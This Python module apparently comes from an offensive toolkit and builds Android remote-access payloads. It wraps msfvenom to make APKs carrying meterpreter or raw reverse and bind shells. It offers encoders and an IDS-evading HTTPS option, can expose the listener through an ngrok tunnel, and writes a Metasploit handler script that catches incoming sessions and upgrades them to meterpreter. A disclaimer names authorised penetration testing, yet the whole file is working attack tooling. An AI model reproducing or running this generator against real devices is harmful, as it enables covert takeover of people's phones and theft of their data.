"""
Payload Generator — wraps msfvenom to produce Android APK payloads.
All generated payloads are for use in authorised penetration tests only.
"""

import os
import subprocess
from pathlib import Path
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from core.utils import (
    require_tools, get_local_ip, find_free_port,
    PAYLOADS_DIR, run_cmd, log_event, random_str
)

console = Console()

PAYLOAD_TYPES = {
    "1": {
        "name": "Android Meterpreter Reverse TCP",
        "payload": "android/meterpreter/reverse_tcp",
        "ext": "apk",
        "desc": "Classic reverse TCP meterpreter shell",
    },
    "2": {
        "name": "Android Meterpreter Reverse HTTPS",
        "payload": "android/meterpreter/reverse_https",
        "ext": "apk",
        "desc": "Encrypted HTTPS meterpreter (evades basic IDS)",
    },
    "3": {
        "name": "Android Shell Reverse TCP",
        "payload": "android/shell/reverse_tcp",
        "ext": "apk",
        "desc": "Raw shell — lightweight, no meterpreter",
    },
    "4": {
        "name": "Android Meterpreter Reverse HTTP",
        "payload": "android/meterpreter/reverse_http",
        "ext": "apk",
        "desc": "HTTP-based meterpreter",
    },
    "5": {
        "name": "Android Meterpreter Bind TCP",
        "payload": "android/meterpreter/bind_tcp",
        "ext": "apk",
        "desc": "Bind TCP — device listens, you connect",
    },
}

ENCODER_LIST = {
    "1": ("none",          "No encoding"),
    "2": ("x86/shikata_ga_nai", "Polymorphic XOR additive feedback"),
    "3": ("generic/none",  "Generic passthrough"),
}


def show_payload_menu():
    t = Table(title="[bold cyan]Available Android Payloads[/]", show_lines=True)
    t.add_column("#",       style="yellow", width=4)
    t.add_column("Name",    style="bold white")
    t.add_column("Payload", style="cyan")
    t.add_column("Info",    style="dim")
    for k, v in PAYLOAD_TYPES.items():
        t.add_row(k, v["name"], v["payload"], v["desc"])
    console.print(t)


def show_encoder_menu():
    t = Table(title="[bold cyan]Encoders[/]", show_lines=True)
    t.add_column("#",    style="yellow", width=4)
    t.add_column("Encoder", style="bold white")
    t.add_column("Info",    style="dim")
    for k, (enc, desc) in ENCODER_LIST.items():
        t.add_row(k, enc, desc)
    console.print(t)


def generate_payload(
    lhost: str,
    lport: int,
    payload_key: str = "1",
    encoder_key: str = "1",
    iterations: int = 1,
    output_name: Optional[str] = None,
    extra_opts: str = "",
) -> Optional[Path]:

    if not require_tools(["msfvenom"]):
        return None

    pdata    = PAYLOAD_TYPES[payload_key]
    payload  = pdata["payload"]
    encoder  = ENCODER_LIST[encoder_key][0]
    out_name = output_name or f"payload_{random_str(6)}.{pdata['ext']}"
    out_path = PAYLOADS_DIR / out_name

    cmd_parts = [
        "msfvenom",
        f"-p {payload}",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        f"-f {pdata['ext']}",
        f"-o {out_path}",
    ]

    if encoder != "none":
        cmd_parts += [f"-e {encoder}", f"-i {iterations}"]

    if extra_opts:
        cmd_parts.append(extra_opts)

    cmd = " ".join(cmd_parts)
    console.print(f"\n[cyan]► Running:[/] [dim]{cmd}[/]\n")

    with console.status("[bold yellow]Generating payload with msfvenom...[/]", spinner="dots"):
        rc, out, err = run_cmd(cmd, capture=False, timeout=300)

    if rc != 0:
        console.print(f"[red]✘ msfvenom failed:[/] {err}")
        return None

    if out_path.exists():
        size = out_path.stat().st_size
        console.print(f"\n[green]✔ Payload saved:[/] [bold]{out_path}[/]  ({size:,} bytes)")
        log_event(f"Payload generated: {out_path} | {payload} | LHOST={lhost} LPORT={lport}")
        return out_path

    console.print("[red]✘ Output file not found after msfvenom run.[/]")
    return None


def interactive_generate():
    console.rule("[bold red]Android Payload Generator[/]")

    show_payload_menu()
    choice = Prompt.ask("Select payload", choices=list(PAYLOAD_TYPES.keys()), default="1")

    local_ip = get_local_ip()
    lhost    = Prompt.ask("LHOST (listener IP)", default=local_ip)
    lport    = IntPrompt.ask("LPORT (listener port)", default=find_free_port(4444))

    show_encoder_menu()
    enc_choice  = Prompt.ask("Select encoder", choices=list(ENCODER_LIST.keys()), default="1")
    iterations  = 1
    if enc_choice != "1":
        iterations = IntPrompt.ask("Encoding iterations", default=3)

    out_name = Prompt.ask("Output filename (leave blank for auto)", default="")

    use_ngrok = Confirm.ask("Use ngrok tunnel for LHOST?", default=False)
    if use_ngrok:
        from core.ngrok_handler import start_ngrok_tcp
        console.print("[yellow]Starting ngrok...[/]")
        tunnel = start_ngrok_tcp(lport)
        if tunnel:
            lhost = tunnel["host"]
            lport = tunnel["port"]
            console.print(f"[green]✔ ngrok tunnel:[/] {lhost}:{lport}")

    path = generate_payload(
        lhost=lhost,
        lport=lport,
        payload_key=choice,
        encoder_key=enc_choice,
        iterations=iterations,
        output_name=out_name or None,
    )

    if path and Confirm.ask("Generate auto-handler resource script?", default=True):
        _write_handler_rc(PAYLOAD_TYPES[choice]["payload"], lhost, lport, path)


def _write_handler_rc(payload: str, lhost: str, lport: int, apk_path: Path):
    rc_path = apk_path.with_suffix(".rc")
    rc_content = (
        f"use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        f"set ExitOnSession false\n"
        f"set AutoRunScript post/android/manage/shell_to_meterpreter\n"
        f"exploit -j -z\n"
    )
    rc_path.write_text(rc_content)
    console.print(f"[green]✔ Handler script:[/] [bold]{rc_path}[/]")
    console.print(f"[dim]  Start with: msfconsole -r {rc_path}[/]")
